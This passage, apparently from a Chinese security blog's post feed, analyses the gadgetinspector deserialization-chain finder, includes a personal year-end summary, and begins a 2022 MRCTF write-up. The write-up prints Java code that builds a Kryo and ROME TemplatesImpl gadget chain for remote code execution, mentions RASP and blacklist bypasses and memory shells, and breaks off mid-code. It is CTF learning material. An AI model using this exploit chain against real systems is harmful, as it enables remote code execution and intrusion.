其中如果没有生成passthrough数据流操作，就无法判断childMethod1的返回值是否会受到参数arg的影响，也就无法继续判断parentMethod的arg参数与子方法MyObject.childmethod的参数传递关系 也是先看原作者的例子以及创宇的师傅的原文帮助理解 AbstractTableModel$ff19274a.hashcode与子方法IFn.invoke： AbstractTableModel$ff19274a.hashcode的this(0参)传递给了IFn.invoke的1参，表示为0-&gt;IFn.invoke()@1 由于f是通过this.__clojureFnMap(0参)获取的，而f又为IFn.invoke()的this(0参)，即AbstractTableModel$ff19274a.hashcode的0参传递给了IFn.invoke的0参，表示为0-&gt;IFn.invoke()@0 FnCompose.invoke与子方法IFn.invoke： FnCompose.invoked的arg(1参)传递给了IFn.invoke的1参，表示为1-&gt;IFn.invoke()@1 f1为FnCompose的属性(this，0参)，被做为了IFn.invoke的this(0参数)传递，表示为0-&gt;IFn.invoke()@1 f1.invoke(arg)做为一个整体被当作1参传递给了IFn.invoke，由于f1在序列化时我们可以控制具体是IFn的哪个实现类，所以具体调用哪个实现类的invoke也相当于能够控制，即f1.invoke(arg)这个整体可以视为0参数传递给了IFn.invoke的1参(这里只是进行的简单猜测，具体实现在字节码分析中，可能也体现了作者说的合理的风险判断吧)，表示为0-&gt;IFn.invoke()@1 好吧返回正题，来到gadgetinspector.CallGraphDiscovery#discover 会遍历每一个class，并传入ModelGeneratorClassVisitor进行观察，一样的这里加点代码跳过对构造函数的观察 首先是对B类进行观察，还是再列一次反汇编代码 Code: 0: new #2 // class yyds/C 3: dup 4: invokespecial #3 // Method yyds/C.&quot;&lt;init&gt;&quot;:()V 7: aload_1 8: invokevirtual #4 // Method yyds/C.method3:(Ljava/lang/String;)Ljava/lang/String; 11: areturn 长话短说，万物之源肯定还是visitCode，可以看到对于对于非静态方法会额外多一个arg0，不需要理解，本来Java底层就是这样子处理滴 123456789101112131415161718@Overridepublic void visitCode() &#123; super.visitCode(); int localIndex = 0; int argIndex = 0; //使用arg前缀来表示方法入参，后续用于判断是否为目标调用方法的入参 if ((this.access &amp; Opcodes.ACC_STATIC) == 0) &#123; setLocalTaint(localIndex, &quot;arg&quot; + argIndex); localIndex += 1; argIndex += 1; &#125; for (Type argType : Type.getArgumentTypes(desc)) &#123; setLocalTaint(localIndex, &quot;arg&quot; + argIndex); localIndex += argType.getSize(); argIndex += 1; &#125;&#125; 根据汇编由于会调用到invokevirtual,最终会触发gadgetinspector.CallGraphDiscovery.ModelGeneratorMethodVisitor#visitMethodInsn的调用，这里面就会记录最终结果，在代码当中有一些简单的过滤，比如这个arg，就是为了保证参数为当前方法的入参 之后便会在参数discoveredCalls当中记录参数流动关系 当然后面才发现这里还有一个细节的点，我们加强难度，如果代码改为这样，可以看到在上面基础上只是加了个成员变量 1234567891011121314151617181920212223package yyds;import java.io.IOException;public class Test &#123; private String name; public static void main(String[] args) &#123; &#125; public void main(String args) throws IOException &#123; new AA().method1(args, name); &#125;&#125;class AA &#123; public String method1(String param, String param2) &#123; return param + param2; &#125;&#125; 看看他的反汇编 12345678910Code: 0: new #2 // class yyds/AA 3: dup 4: invokespecial #3 // Method yyds/AA.&quot;&lt;init&gt;&quot;:()V 7: aload_1 8: aload_0 9: getfield #4 // Field name:Ljava/lang/String; 12: invokevirtual #5 // Method yyds/AA.method1:(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String; 15: pop 16: return 其实和上面分析过程差不多的，唯一多了个区别就是多了个汇编指令getfield的调用，也因此会触发visitFieldInsn，我们具体来看看gadgetinspector.CallGraphDiscovery.ModelGeneratorMethodVisitor#visitFieldInsn，其实就是判断字段是否是transient的，逻辑也很简单，看注释即可 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152public void visitFieldInsn(int opcode, String owner, String name, String desc) &#123; switch (opcode) &#123; case Opcodes.GETSTATIC: break; case Opcodes.PUTSTATIC: break; case Opcodes.GETFIELD://入操作栈 Type type = Type.getType(desc); if (type.getSize() == 1) &#123; Boolean isTransient = null; // If a field type could not possibly be serialized, it&#x27;s effectively transient if (!couldBeSerialized(serializableDecider, inheritanceMap, new ClassReference.Handle(type.getInternalName()))) &#123; isTransient = Boolean.TRUE; &#125; else &#123; ClassReference clazz = classMap.get(new ClassReference.Handle(owner)); while (clazz != null) &#123; for (ClassReference.Member member : clazz.getMembers()) &#123; if (member.getName().equals(name)) &#123; isTransient = (member.getModifiers() &amp; Opcodes.ACC_TRANSIENT) != 0; break; &#125; &#125; if (isTransient != null) &#123; break; &#125; clazz = classMap.get(new ClassReference.Handle(clazz.getSuperClass())); &#125; &#125; Set&lt;String&gt; newTaint = new HashSet&lt;&gt;(); if (!Boolean.TRUE.equals(isTransient)) &#123; for (String s : getStackTaint(0)) &#123; newTaint.add(s + &quot;.&quot; + name); &#125; &#125; super.visitFieldInsn(opcode, owner, name, desc); //在调用方法前，都会先入栈，作为参数 setStackTaint(0, newTaint); return; &#125; break; case Opcodes.PUTFIELD: break; default: throw new IllegalStateException(&quot;Unsupported opcode: &quot; + opcode); &#125; super.visitFieldInsn(opcode, owner, name, desc);&#125; 这一部分也算完结了 SourceDiscovery在gadgetinspector中，存在着多个SourceDiscovery的实现，有jackson的，java原生序列化的等等，我这里主要以jackson的SourceDiscovery实现开始分析 首先在SourceDiscovery抽象类的discover当中，先是加载了所有的类、方法、继承实现关系的数据 12345678910111213141516171819public void discover() throws IOException &#123; Map&lt;ClassReference.Handle, ClassReference&gt; classMap = DataLoader.loadClasses(); Map&lt;MethodReference.Handle, MethodReference&gt; methodMap = DataLoader.loadMethods(); InheritanceMap inheritanceMap = InheritanceMap.load(); Map&lt;MethodReference.Handle, Set&lt;GraphCall&gt;&gt; graphCallMap = new HashMap&lt;&gt;(); for (GraphCall graphCall : DataLoader.loadData(Paths.get(&quot;callgraph.dat&quot;), new GraphCall.Factory())) &#123; MethodReference.Handle caller = graphCall.getCallerMethod(); if (!graphCallMap.containsKey(caller)) &#123; Set&lt;GraphCall&gt; graphCalls = new HashSet&lt;&gt;(); graphCalls.add(graphCall); graphCallMap.put(caller, graphCalls); &#125; else &#123; graphCallMap.get(caller).add(graphCall); &#125; &#125; discover(classMap, methodMap, inheritanceMap, graphCallMap);&#125; 接下来调用discover在实现类gadgetinspector.javaserial.SimpleSourceDiscovery#discover,主要是收集可用的source，逻辑也很简单了 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364public void discover(Map&lt;ClassReference.Handle, ClassReference&gt; classMap, Map&lt;MethodReference.Handle, MethodReference&gt; methodMap, InheritanceMap inheritanceMap) &#123; final SerializableDecider serializableDecider = new SimpleSerializableDecider(inheritanceMap); for (MethodReference.Handle method : methodMap.keySet()) &#123; if (Boolean.TRUE.equals(serializableDecider.apply(method.getClassReference()))) &#123; if (method.getName().equals(&quot;finalize&quot;) &amp;&amp; method.getDesc().equals(&quot;()V&quot;)) &#123; addDiscoveredSource(new Source(method, 0)); &#125; &#125; &#125; // If a class implements readObject, the ObjectInputStream passed in is considered tainted for (MethodReference.Handle method : methodMap.keySet()) &#123; if (Boolean.TRUE.equals(serializableDecider.apply(method.getClassReference()))) &#123; if (method.getName().equals(&quot;readObject&quot;) &amp;&amp; method.getDesc().equals(&quot;(Ljava/io/ObjectInputStream;)V&quot;)) &#123; addDiscoveredSource(new Source(method, 1)); &#125; &#125; &#125; // Using the proxy trick, anything extending serializable and invocation handler is tainted. for (ClassReference.Handle clazz : classMap.keySet()) &#123; if (Boolean.TRUE.equals(serializableDecider.apply(clazz)) &amp;&amp; inheritanceMap.isSubclassOf(clazz, new ClassReference.Handle(&quot;java/lang/reflect/InvocationHandler&quot;))) &#123; MethodReference.Handle method = new MethodReference.Handle( clazz, &quot;invoke&quot;, &quot;(Ljava/lang/Object;Ljava/lang/reflect/Method;[Ljava/lang/Object;)Ljava/lang/Object;&quot;); addDiscoveredSource(new Source(method, 0)); &#125; &#125; // hashCode() or equals() are accessible entry points using standard tricks of putting those objects // into a HashMap. for (MethodReference.Handle method : methodMap.keySet()) &#123; if (Boolean.TRUE.equals(serializableDecider.apply(method.getClassReference()))) &#123; if (method.getName().equals(&quot;hashCode&quot;) &amp;&amp; method.getDesc().equals(&quot;()I&quot;)) &#123; addDiscoveredSource(new Source(method, 0)); &#125; if (method.getName().equals(&quot;equals&quot;) &amp;&amp; method.getDesc().equals(&quot;(Ljava/lang/Object;)Z&quot;)) &#123; addDiscoveredSource(new Source(method, 0)); addDiscoveredSource(new Source(method, 1)); &#125; &#125; &#125; // Using a comparator proxy, we can jump into the call() / doCall() method of any groovy Closure and all the // args are tainted. // https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial/payloads/Groovy1.java for (MethodReference.Handle method : methodMap.keySet()) &#123; if (Boolean.TRUE.equals(serializableDecider.apply(method.getClassReference())) &amp;&amp; inheritanceMap.isSubclassOf(method.getClassReference(), new ClassReference.Handle(&quot;groovy/lang/Closure&quot;)) &amp;&amp; (method.getName().equals(&quot;call&quot;) || method.getName().equals(&quot;doCall&quot;))) &#123; addDiscoveredSource(new Source(method, 0)); Type[] methodArgs = Type.getArgumentTypes(method.getDesc()); for (int i = 0; i &lt; methodArgs.length; i++) &#123; addDiscoveredSource(new Source(method, i + 1)); &#125; &#125; &#125; &#125; GadgetChainDiscovery接下来就是最重要的生成利用链的部分了，这部分整合了上面所有的信息，会遍历全部的source，并在callgraph.dat中递归查找所有可以继续传递污点参数的子方法调用，直至遇到sink标记的方法，看看discover即可，带了备注 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108public void discover() throws Exception &#123; //方法信息 Map&lt;MethodReference.Handle, MethodReference&gt; methodMap = DataLoader.loadMethods(); InheritanceMap inheritanceMap = InheritanceMap.load(); //得到方法的所有子类方法实现 Map&lt;MethodReference.Handle, Set&lt;MethodReference.Handle&gt;&gt; methodImplMap = InheritanceDeriver.getAllMethodImplementations( inheritanceMap, methodMap); final ImplementationFinder implementationFinder = config.getImplementationFinder( methodMap, methodImplMap, inheritanceMap); //写入文件 try (Writer writer = Files.newBufferedWriter(Paths.get(&quot;methodimpl.dat&quot;))) &#123; for (Map.Entry&lt;MethodReference.Handle, Set&lt;MethodReference.Handle&gt;&gt; entry : methodImplMap.entrySet()) &#123; writer.write(entry.getKey().getClassReference().getName()); writer.write(&quot;\\t&quot;); writer.write(entry.getKey().getName()); writer.write(&quot;\\t&quot;); writer.write(entry.getKey().getDesc()); writer.write(&quot;\\n&quot;); for (MethodReference.Handle method : entry.getValue()) &#123; writer.write(&quot;\\t&quot;); writer.write(method.getClassReference().getName()); writer.write(&quot;\\t&quot;); writer.write(method.getName()); writer.write(&quot;\\t&quot;); writer.write(method.getDesc()); writer.write(&quot;\\n&quot;); &#125; &#125; &#125; //方法调用map，key为父方法，value为子方法与父方法参数传递关系 Map&lt;MethodReference.Handle, Set&lt;GraphCall&gt;&gt; graphCallMap = new HashMap&lt;&gt;(); for (GraphCall graphCall : DataLoader.loadData(Paths.get(&quot;callgraph.dat&quot;), new GraphCall.Factory())) &#123; MethodReference.Handle caller = graphCall.getCallerMethod(); if (!graphCallMap.containsKey(caller)) &#123; Set&lt;GraphCall&gt; graphCalls = new HashSet&lt;&gt;(); graphCalls.add(graphCall); graphCallMap.put(caller, graphCalls); &#125; else &#123; graphCallMap.get(caller).add(graphCall); &#125; &#125; //exploredMethods保存在调用链从查找过程中已经访问过的方法节点，methodsToExplore保存调用链 Set&lt;GadgetChainLink&gt; exploredMethods = new HashSet&lt;&gt;(); LinkedList&lt;GadgetChain&gt; methodsToExplore = new LinkedList&lt;&gt;(); for (Source source : DataLoader.loadData(Paths.get(&quot;sources.dat&quot;), new Source.Factory())) &#123; GadgetChainLink srcLink = new GadgetChainLink(source.getSourceMethod(), source.getTaintedArgIndex()); if (exploredMethods.contains(srcLink)) &#123; continue; &#125; methodsToExplore.add(new GadgetChain(Arrays.asList(srcLink))); exploredMethods.add(srcLink); &#125; long iteration = 0; Set&lt;GadgetChain&gt; discoveredGadgets = new HashSet&lt;&gt;(); //使用广度优先搜索所有从source到sink的调用链 while (methodsToExplore.size() &gt; 0) &#123; if ((iteration % 1000) == 0) &#123; LOGGER.info(&quot;Iteration &quot; + iteration + &quot;, Search space: &quot; + methodsToExplore.size()); &#125; iteration += 1; GadgetChain chain = methodsToExplore.pop(); GadgetChainLink lastLink = chain.links.get(chain.links.size()-1); //获取当前节点方法所有子方法与当前节点方法参数传递关系 Set&lt;GraphCall&gt; methodCalls = graphCallMap.get(lastLink.method); if (methodCalls != null) &#123; for (GraphCall graphCall : methodCalls) &#123; //如果当前节点方法的污染参数与当前子方法受父方法参数影响的Index不一致则跳过 if (graphCall.getCallerArgIndex() != lastLink.taintedArgIndex) &#123; continue; &#125; Set&lt;MethodReference.Handle&gt; allImpls = implementationFinder.getImplementations(graphCall.getTargetMethod()); for (MethodReference.Handle methodImpl : allImpls) &#123; GadgetChainLink newLink = new GadgetChainLink(methodImpl, graphCall.getTargetArgIndex()); //如果新方法已近被访问过了，则跳过,这里能减少开销。但是这一步跳过会使其他链/分支链经过此节点时，由于已经此节点被访问过了，链会在这里断掉。那么如果这个条件去掉就能实现找到所有链了吗？这里去掉会遇到环状问题，造成路径无限增加 if (exploredMethods.contains(newLink)) &#123; continue; &#125; //新节点与之前的链组成新链 GadgetChain newChain = new GadgetChain(chain, newLink); //如果到达了sink，则加入discoveredGadgets if (isSink(methodImpl, graphCall.getTargetArgIndex(), inheritanceMap)) &#123; discoveredGadgets.add(newChain); &#125; else &#123; methodsToExplore.add(newChain); exploredMethods.add(newLink); &#125; &#125; &#125; &#125; &#125; try (OutputStream outputStream = Files.newOutputStream(Paths.get(&quot;gadget-chains.txt&quot;)); Writer writer = new OutputStreamWriter(outputStream, StandardCharsets.UTF_8)) &#123; for (GadgetChain chain : discoveredGadgets) &#123; printGadgetChain(writer, chain); &#125; &#125; System.out.println(Paths.get(&quot;gadget-chains.txt&quot;)); LOGGER.info(&quot;Found &#123;&#125; gadget chains.&quot;, discoveredGadgets.size()); &#125; 到这里GI的关键逻辑也走完了难点部分也结束了 题外话关于dup指令这里我非常好奇java虚拟机里的dup指令的作用，看官方描述是复制栈顶数值并将复制值压入栈顶，很懵逼，但看了脚本之家的例子后就完全明白了 对于类 12345678public class ExceptionTest&#123; void cantBeZero(int i) throws Exception&#123; throw new Exception(); &#125;&#125; 得到字节码如下 1234567890: iload_11: ifne 124: new #2 // class java/lang/Exception7: dup8: invokespecial #3 // Method java/lang/Exception.&quot;&lt;init&gt;&quot;:()V11: athrow12: return 其中new指令在java堆上为Exception对象分配内存空间，并将地址压入操作数栈顶； 然后dup指令为复制操作数栈顶值，并将其压入栈顶，也就是说此时操作数栈上有连续相同的两个对象地址； invokespecial指令调用实例初始化方法:()V，注意这个方法是一个实例方法，所以需要从操作数栈顶弹出一个this引用，也就是说这一步会弹出一个之前入栈的对象地址； athrow指令从操作数栈顶取出一个引用类型的值，并抛出； 最后由return指令结束方法 从上面的五个步骤中可以看出，需要从栈顶弹出两个实例对象的引用，这就是为什么会在new指令下面有一个dup指令 关于CC​ 在简单了解完逻辑之后，打算试一试扫描cc组件，但是没有出现任何的结果，于是就做了一些简单的修改，在gadgetinspector.GadgetChainDiscovery#isSink我增加了一条规则直接将org.apache.commons.collections.Transformer#transform 作为 sink 1234if (method.getClassReference().getName().equals(&quot;org/apache/commons/collections/Transformer&quot;) &amp;&amp; method.getName().equals(&quot;transform&quot;)) &#123; return true;&#125; 但是之后发现比如像AnnotationInvocationHandler这样的链，由于LazyMap在之前可能被添加到exploredMethods当中，导致利用链断了，后面自己尝试了下修复bug通过设置记录最大重复分支，但是发现重复利用链太多了，还是顶哦，还好发现了某个大师傅的宝藏仓库，里面对重复以及重复链做了聚合优化 https://github.com/5wimming/gadgetinspector/blob/main/src/main/java/gadgetinspector/GadgetChainDiscovery.java 看了思路后尝试自己修改，最终出来的结果这样看起来更直观666 之后还有其他问题比如像cc当中的有PriorityQueue的链子，由于下面这串代码也会受影响 1234 //如果当前节点方法的污染参数与当前子方法受父方法参数影响的Index不一致则跳过if (graphCall.getCallerArgIndex() != lastLink.taintedArgIndex ) &#123; continue;&#125; 暂时的解决方案就是注释掉这一行来获得所有利用链，但是就是太慢了，而且人工审计工作量更大 总之GI真的太笨重了，这里主要是学习原理也不想深入改bug了 参考文章https://xz.aliyun.com/t/7058 https://cloud.tencent.com/developer/article/1633445 https://www.cnblogs.com/tr1ple/p/12800859.html https://www.jianshu.com/p/dfdfdb455d8c https://xz.aliyun.com/t/7058 https://paper.seebug.org/1034/","categories":[{"name":"Java","slug":"Java","permalink":"https://y4tacker.github.io/categories/Java/"}],"tags":[{"name":"Java","slug":"Java","permalink":"https://y4tacker.github.io/tags/Java/"},{"name":"自动化","slug":"自动化","permalink":"https://y4tacker.github.io/tags/%E8%87%AA%E5%8A%A8%E5%8C%96/"}]},{"title":"写给自己的2022年终总结","slug":"year/2022/5/写给自己的2021年终总结","date":"2022-05-05T04:03:45.000Z","updated":"2024-08-04T09:01:49.428Z","comments":true,"path":"2022/05/05/year/2022/5/写给自己的2021年终总结/","link":"","permalink":"https://y4tacker.github.io/2022/05/05/year/2022/5/%E5%86%99%E7%BB%99%E8%87%AA%E5%B7%B1%E7%9A%842021%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/","excerpt":"","text":"写给自己的2021年终总结写在前面​ 想了想还是给自己写一个2021年的年终总结，回顾下过去一年所做的事情，复盘下自己的不足、待改进项。也便于未来时不时回来看看过去的我都在想一些什么。本来打算2022年年初写一篇的，可惜太懒了加上当时也忙着打比赛还有偶尔准备下实习面试的准备就一直没写，拖到了现在。疫情期间，有舍有得，且行且珍惜。主要是技术相关的吧，一些生活方面的不是很想在网上公开呢。 回忆2021年​ 这段时间还是比较迷茫，不知道该干什么，特别是刚刚一月的时候，特别是想着每次打比赛都没有输出很难受(从20年九月进战队那时还是刚刚入门没多久，前两个月比赛题最多做出来了一道题很难受自闭了一段时间，再加上疫情我一个人在学校，最自闭的时候好几天都开心不起来)，也记不清了 ​ 也恰好在一月，成为我一个重要的人生转折点，在一月和我的朋友们一起参加了几个小比赛，有CTFSHOW的DJBCTF，这也是我第一个AK的比赛，这次比赛后我也重拾了很多信心(真的刷题学习半年了，很难受这一次比赛算是对我最大的安慰了)，在这个月也是我和我的小可爱相识的日子，还记得和你分享我比赛的那天，被小可爱表扬很开心(虽然那时候还没有在一起，但有你和我分享快乐) ​ 二月也应该AK了两个比赛？不太记得清了，SXCCTF和四叶草网络安全学院牛年CTF大赛都是第一名虽然都是小比赛，但慢慢给了我信心，也为我之后AK道路埋下了伏笔吧，这个月没什么特别的 ​ 三月中V&amp;NCTF2021个人赛拿了Web单方向第五名其实是并列第一，只是有一个题稍微做的慢点了，这时候似乎慢慢开始被安全圈子的小伙伴慢慢知晓了，后面还参加了NepCTF2021拿了个第四，当然这个月最重要的事就是和我的小可爱确定了关系 之后三月，入手了第一台Mini90，可惜后来吃灰了，不过也是拍了很多好看的照片啦 接下来的时间里4-6月，又开始迷茫了感觉光打CTF不行呢，于是开始接触了一些实际的东西，开始挖CMS的洞，记得第一个提交的是ThinkPHP3下的变量覆盖的RCE，之后在三个月陆陆续续交了一百多个洞吧，有前台的也有后台的主要是RCE，期间也打了一些比赛，这里也不多说了，不是很大，之前三月前记录比赛名称主要是真的对当时的我意义重大 ​ 在这期间还参加了国赛(可惜一些原因放弃了去线下的机会)，同时还有最重要的强网杯，也是这次比赛让我接触了内网渗透的一些东西，当然线上的一些题也被我做出来了差不多又ak了吧，当然线下比较惨，也是吃了渗透的亏，渗透只打了第一层，不过还是水了个全国三等奖还是不错滴，同时这段时间里还认识了很多CTF圈子里厉害的大佬，后面还有个强网杯自动化渗透的赛道被学长带飞拿了个第二，还是有点后悔，其实差一点点就第一了，真的就差那一点 ​ 之后的后半年当中，也打了一些比赛基本上一两月一次的频次吧，也是拿了很多奖，之后大概就是在开始学习Java了吧，在这期间也建立了一个小仓库,一直都在更新，更多是记录自己的学习过程 年底的时候，体验了两次面试，刚开始面试比较紧张很多都说不出来虽然都知道也都做过，不过后来也过了一个长亭的实习，可惜由于疫情开学会封校也去不了了，有点小可惜 2022年-4月 还是简简单单写下关于2022吧，不会很认真写，不然年底还写啥勒，莫名其妙加了很多星球都是白嫖，也认识了很多人，特别是漂亮鼠主管人也很有趣(每天不学习就会被骂) 在2022年初参加了个阿里云的webshell检测挑战，那时候还是一窍不通开始搞jsp最后混了个🥉自己觉得还行，奖牌也挺好看的 之后就是准备等3月各个公司hc开了投简历，陆续投了俩先是投了一个白帽汇安全研究方向，虽然过了但是我第一次实习工作还是想去大厂试试，之后就是阿里云了，很幸运最后被徐师收留了，中间的小插曲也很有趣反复催hr进度，后面由于到处都锁hc了本以为没戏了，没想到最后还是发了 最近因为一些原因也退了很多群(比赛群+安全学习群)，包括我之前一直很喜欢的赛博群，主要还是觉得自从加了群以后日渐浮躁(可能还是疫情的原因吧，大家都挺不容易的)，我喜欢的技术性话题也越来越少了，另外我也比较容易受周围的气氛影响，因此也打算暂时退出群好好静一段时间再打算吧。 索性经过五一的调休这两天慢慢恢复了过来没那么浮躁了，也要继续开始之后的冒险了！ 当然如果让我说从2020到2021我学会了什么，大概是慢慢学会了接受自己的不足，减少了社交欲望，慢慢专注于自己热爱的东西吧。","categories":[{"name":"总结","slug":"总结","permalink":"https://y4tacker.github.io/categories/%E6%80%BB%E7%BB%93/"}],"tags":[{"name":"总结","slug":"总结","permalink":"https://y4tacker.github.io/tags/%E6%80%BB%E7%BB%93/"}]},{"title":"2022MRCTF-Java部分","slug":"year/2022/4/2022MRCTF-Java部分","date":"2022-04-24T04:41:06.000Z","updated":"2024-08-04T09:01:49.222Z","comments":true,"path":"2022/04/24/year/2022/4/2022MRCTF-Java部分/","link":"","permalink":"https://y4tacker.github.io/2022/04/24/year/2022/4/2022MRCTF-Java%E9%83%A8%E5%88%86/","excerpt":"","text":"2022MRCTF-Java部分总结总的来说是一次非常不错的比赛，这里也会简单列出考点方便查阅学习，不难有点引导性质 Ps：此次比赛都是不出网，所以都需要内存马，内存马部分不做讲解很简单百度搜搜 下面这两题挺不错的也学到了东西，题目做了备份，核心代码(exp)也放到了git仓库备份，本篇只是思路帖子 https://github.com/Y4tacker/CTFBackup/tree/main/2022/2022MRCTF Springcoffee–Kryo反序列化、绕Rasp EzJava–绕Serialkiller黑名单中cc关键组件 下面这两题没啥参考价值，不过让我搞了下实战也还不错 Java_mem_shell_Filter–log4j2打jndi Java_mem_shell_Basic—tomcat弱口令 Springcoffee – Kryo反序列化、绕Raspok，这东西也是从来没学过，又是从头开始，这里记录了当时是如何思考的分析思考过程 思路分析首先看看整体目录结构 这里挑几个重要的来讲一下CoffeeController order路由反序列化 1234567@RequestMapping(&#123;&quot;/coffee/order&quot;&#125;)public Message order(@RequestBody CoffeeRequest coffee) &#123; if (coffee.extraFlavor != null) &#123; ByteArrayInputStream bas = new ByteArrayInputStream(Base64.getDecoder().decode(coffee.extraFlavor)); Input input = new Input(bas); ExtraFlavor flavor = (ExtraFlavor)this.kryo.readClassAndObject(input); return new Message(200, flavor.getName()); demo路由，主要是根据输入修改一些关键配置，这个比较关键之后再说 1234567891011121314151617181920212223242526272829303132333435363738@RequestMapping(&#123;&quot;/coffee/demo&quot;&#125;) public Message demoFlavor(@RequestBody String raw) throws Exception &#123; System.out.println(raw); JSONObject serializeConfig = new JSONObject(raw); if (serializeConfig.has(&quot;polish&quot;) &amp;&amp; serializeConfig.getBoolean(&quot;polish&quot;)) &#123; this.kryo = new Kryo(); Method[] var3 = this.kryo.getClass().getDeclaredMethods(); int var4 = var3.length; for(int var5 = 0; var5 &lt; var4; ++var5) &#123; Method setMethod = var3[var5]; if (setMethod.getName().startsWith(&quot;set&quot;)) &#123; try &#123; Object p1 = serializeConfig.get(setMethod.getName().substring(3)); if (!setMethod.getParameterTypes()[0].isPrimitive()) &#123; try &#123; p1 = Class.forName((String)p1).newInstance(); setMethod.invoke(this.kryo, p1); &#125; catch (Exception var9) &#123; var9.printStackTrace(); &#125; &#125; else &#123; setMethod.invoke(this.kryo, p1); &#125; &#125; catch (Exception var10) &#123; &#125; &#125; &#125; &#125; ByteArrayOutputStream bos = new ByteArrayOutputStream(); Output output = new Output(bos); this.kryo.register(Mocha.class); this.kryo.writeClassAndObject(output, new Mocha()); output.flush(); output.close(); return new Message(200, &quot;Mocha!&quot;, Base64.getEncoder().encode(bos.toByteArray())); &#125; 首先要解决这道题，我们得知道前人都有一些什么研究 通过谷歌简单搜索可以搜到一篇文章：浅析Dubbo Kryo/FST反序列化漏洞（CVE-2021-25641） 其中比较有信息量的是调用栈，但是这里题目环境里面没有依赖 但是这里有rome依赖，那么很容易想到EqualsBean去触发ROME的利用链子 具体利用过程(Payload构造过程)根据dubbo的利用链进行修改我们可以得到这样的代码 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124package demo;import com.esotericsoftware.kryo.Kryo;import com.esotericsoftware.kryo.io.Input;import com.esotericsoftware.kryo.io.Output;import com.esotericsoftware.kryo.util.DefaultInstantiatorStrategy;import com.rometools.rome.feed.impl.EqualsBean;import com.rometools.rome.feed.impl.ToStringBean;import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;import com.sun.rowset.JdbcRowSetImpl;import fun.mrctf.springcoffee.model.ExtraFlavor;import fun.mrctf.springcoffee.model.Mocha;import javassist.ClassPool;import org.json.JSONObject;import org.objenesis.strategy.SerializingInstantiatorStrategy;import org.objenesis.strategy.StdInstantiatorStrategy;import org.springframework.aop.target.HotSwappableTargetSource;import javax.sql.rowset.BaseRowSet;import javax.xml.transform.Templates;import java.io.ByteArrayInputStream;import java.io.ByteArrayOutputStream;import java.io.IOException;import java.lang.reflect.Field;import java.lang.reflect.Method;import java.net.InetAddress;import java.net.URL;import java.net.URLConnection;import java.net.URLStreamHandler;import java.util.Base64;import java.util.HashMap;public class Testt &#123; protected Kryo kryo = new Kryo(); public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception &#123; Field field = obj.getClass().getDeclaredField(fieldName); field.setAccessible(true); field.set(obj, value); &#125; public String ser(String raw) throws Exception&#123; JSONObject serializeConfig = new JSONObject(raw); if (serializeConfig.has(&quot;polish&quot;) &amp;&amp; serializeConfig.getBoolean(&quot;polish&quot;)) &#123; this.kryo = new Kryo(); Method[] var3 = this.kryo.getClass().getDeclaredMethods(); int var4 = var3.length; for(int var5 = 0; var5 &lt; var4; ++var5) &#123; Method setMethod = var3[var5]; if (setMethod.getName().startsWith(&quot;set&quot;)) &#123; try &#123; Object p1 = serializeConfig.get(setMethod.getName().substring(3)); if (!setMethod.getParameterTypes()[0].isPrimitive()) &#123; try &#123; p1 = Class.forName((String)p1).newInstance(); setMethod.invoke(this.kryo, p1); &#125; catch (Exception var9) &#123; var9.printStackTrace(); &#125; &#125; else &#123; setMethod.invoke(this.kryo, p1); &#125; &#125; catch (Exception var10) &#123; &#125; &#125; &#125; &#125; ByteArrayOutputStream bos = new ByteArrayOutputStream(); Output output = new Output(bos); HashMap&lt;Object, Object&gt; objectObjectHashMap = new HashMap&lt;&gt;(); TemplatesImpl templates = new TemplatesImpl(); byte[][] bytes = new byte[][]&#123;ClassPool.getDefault().get(&quot;demo.YYDS&quot;).toBytecode()&#125;; EqualsBean bean = new EqualsBean(String.class,&quot;&quot;); setFieldValue(templates, &quot;_bytecodes&quot;, bytes); setFieldValue(templates, &quot;_name&quot;, &quot;1&quot;); setFieldValue(templates, &quot;_tfactory&quot;, new TransformerFactoryImpl()); setFieldValue(bean,&quot;beanClass&quot;, Templates.class); setFieldValue(bean,&quot;obj&quot;,templates); Object gadgetChain = Utils.makeXStringToStringTrigger(templates,bean); // toString() trigger objectObjectHashMap.put(gadgetChain,&quot;&quot;); kryo.writeClassAndObject(output, objectObjectHashMap); output.flush(); output.close(); return new String(Base64.getEncoder().encode(bos.toByteArray())); &#125; public void deser(String raw)&#123; ByteArrayInputStream bas = new ByteArrayInputStream(Base64.getDecoder().decode(raw)); Input input = new Input(bas); ExtraFlavor flavor = (ExtraFlavor)this.kryo.readClassAndObject(input); System.out.println(flavor.getName()); &#125; public static void main(String[] args) throws Exception &#123; Testt test = new Testt(); String ser = test.ser(&quot;&#123;\\&quot;polish\\&quot;:true,\\&quot;RegistrationRequired\\&quot;:false,\\&quot;InstantiatorStrategy\\&quot;: \\&quot;org.objenesis.strategy.StdInstantiatorStrategy\\&quot;&#125;&quot;); test.deser(ser); &#125;&#125; 以及Utils类 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216package demo;import com.sun.org.apache.xalan.internal.xsltc.DOM;import com.sun.org.apache.xalan.internal.xsltc.TransletException;import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;import com.sun.org.apache.xml.internal.serializer.SerializationHandler;import javassist.ClassClassPath;import javassist.ClassPool;import javassist.CtClass;import org.springframework.aop.target.HotSwappableTargetSource;import sun.reflect.ReflectionFactory;import 